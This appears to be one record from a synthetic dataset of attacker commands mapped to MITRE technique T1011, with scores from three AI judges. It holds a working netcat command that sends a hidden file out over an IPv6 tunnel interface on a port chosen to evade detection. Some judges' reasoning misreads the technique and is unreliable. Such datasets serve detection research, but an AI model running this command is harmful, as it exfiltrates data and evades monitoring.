@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -s \"$(ipconfig getv6ifaddr stf0)\" \"fe80::9:bead:3%stf0\" 52217 < /tmp/.q",
+  "explanation": "Uses IPv6 TCP bound to the 6to4/tunnel interface (stf0) targeting a link-local address on an uncommon port, meeting T1011 by selecting an alternate network medium for exfiltration.",
+  "rationale_steps": [
+    "Leverage ipconfig to read the stf0 IPv6 address for source binding.",
+    "Send data via TCP over the stf0 tunnel to avoid the primary network path.",
+    "Choose a high, uncommon destination port to minimize detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-6cd37c09",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat (-6 for IPv6, -s for source address), and correct command substitution syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 by using IPv6 link-local addressing over a tunnel interface (stf0) on an uncommon port (52217) for exfiltration, though it's debatable whether this is truly dynamic resolution versus just using an alternative network path.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:15:05.599127Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct quoting, valid flags for 'nc', and proper shell redirection and command substitution.",
+        "semantic_score": 1,
+        "semantic_justification": "The command targets a fixed link-local IPv6 address and port, which does not involve 'dynamic resolution' of endpoints as the core behavior of T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:15:13.627448Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, valid nc flags (-6, -s), a properly scoped IPv6 literal, and correct input redirection.",
+        "semantic_score": 1,
+        "semantic_justification": "Although it can exfiltrate data over IPv6, it targets a static link-local address and exhibits no dynamic resolution behavior (e.g., DGA, fast-flux, rotating endpoints) as described for T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:15:27.218990Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
